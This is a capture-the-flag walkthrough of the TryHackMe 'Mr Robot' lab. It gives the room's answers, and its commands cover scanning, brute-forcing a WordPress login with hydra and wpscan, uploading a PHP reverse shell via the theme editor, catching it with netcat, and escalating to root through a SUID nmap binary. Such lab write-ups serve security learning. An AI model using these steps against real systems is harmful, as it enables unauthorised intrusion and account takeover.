# MR ROBOT
This is one of my favourite shows and also one of my favourite room in **Tryhackme**.
This room is ment for beginner and intermediate level (*Experts* can try it too tho).
Let's jump into it.
<br>
___

## Scanning
We always start with scanning the network using ***nmap***.<br>
I personally us this command in most of my scan : :
```Bash
nmap -sC -sV -T4 -A -v -p- -oN namp.txt <ip>
```
Here's the full namap scan result **[nmap.txt](nmap.txt)**

Scanning the nmap we've found **3** common ports are open

1. port 22
    - Unordered sub-list.
    - version unknown 
2. port 80
    - http
    - Apache httpd
    - Supported Methods: GET HEAD POST OPTIONS
3. port 443
    - ssl/http 
    - Apache httpd
    - Supported Methods: GET HEAD POST OPTIONS
__

## Recon
Now if we look into the *IP*, we'll see that there is a weird terminal like page hosted.
This page doesn't take any normal commands like ```ls, whoami, ifconfig```. But we can use the command `help` to view available commands for us.

Available commands are:
```bash
prepare
fsociety
inform
question
wakeup
join
```
Let's check them

`prepare` command will show you a video.

`fsociety` command will also show you a video.

`inform` will show you a slide about the corrupted organizations.

`question` does the same and shows you some slides.

`wakeup` shows you a video.

`join` this one opens another terminal like page where you have to provide an email address of yours. You can provide a fake email an it will accept it.

On thing that cought my attention is, everytime I was using a command, it was reflecting on the **URL** as a directory. So I decided to brute fourse the directory with **Ffuf**. <br>
In this case I've used the wordlist **directory-list-2.3-medium.txt** from **dirbuster** wordlist.
```bash
ffuf -u https://10.10.214.177/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 301
```

###### Result
I've found some directories:
1. robots
2. sitemap
3. dashboard
4. wp-login
5. license
6. readme

I checked ***robots*** directory and found 2 hidden directories called **key-1-of-3.txt** and **fsocity.dic**.<br>
Check the text file and you will get the first key.

I downloaded the **fsocity.dic** file and turns out that it is a wordlist.

The site is made with _Wordpress_
I checked the wordpress version using **wappalizer** and found out that it's using version: `4.3.1`.<br>I searched for some exploit and found a [RCE exploit](https://www.exploit-db.com/exploits/50255) <br>
I tried but this didn't work. So I scanned it with **wpscan** tool.
```bash
wpscan --url IP --api-token API-KEY
```
**wp-scan** result: [wpscan.txt](wpscan.txt)

Found some vulnerabilities but noting special. 

---
## Exploitation
I decided to brute force on the **login** page with **Burp Intruder**

Found the user name **El###t**. On the login page the error will say: `The password you entered for the username El###t is incorrect.`

Now let's brute force with **hydra**.<br>
```bash
hydra -l Elliot -P fsocity.dic 10.10.26.240 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.26.240%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

Unfortunately *hydra* was being a bitch. So I had to use **WPSCAN**. But before that I removed duplicate words from the **fsocity.dic**.
```bash
cat fsocity.dic | sort | uniq > passwords.txt
wpscan --url <ip>/wp-login.php -U elliot -P password.txt
```

Then I got the password for our user which is **ER28-0652**

Now login to the admin panel and upload your [shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).Don't forget to change your **IP** and **PORT**.

I uploaded mine into **page.php**.

For that you have to go to `Appearance > Editor`. On the rightside you will see all the pages available like 404.php, singlepage so on.

Now start **NETCAT** to listen on your port specified. I used the port **4499** in this case.

`nc -lnvp 4499`

visit the 404.php page and you will get a reverse shell.

Moving to home directory, I found a user directoy `/robot` with our second key and a password in MD5 formate.

I used **[crack station](https://crackstation.net)** to decrypt the pass.

But there was a problem that was stopping me from executing `su` command and giving me an error like `su: must be run from a terminal`. 

After searching for a while I found a *StackOverFlow* post where they suggest some solutions. I used python to span another shell
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
Now we can read the **2nd** key from `/home/robot` directory.

After that we have to switch up to **ROOT** which is our final leveling up. I checked the hint and it said **nmap**.<br>
The first thing that came into my mind is checking if the **SUID bit** is set or not.

I check it using the command:
```bash
find / -perm -u=s -type f 2>/dev/null
```
Annnddddd there I was right. It has its suid bit set to root
**`-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap`**

To exploit it I checked the legend, the boss [https://gtfobins.github.io/](https://gtfobins.github.io/gtfobins/nmap/)

To get the `root` shell I used 
```nmap --interactive``` it will allow us to run **nmap** in interactive mode.
Then type `!sh` to span shell as root.

At last got to root directory and submit the flag.

# Now you're a **`H4CK3R M4N`**
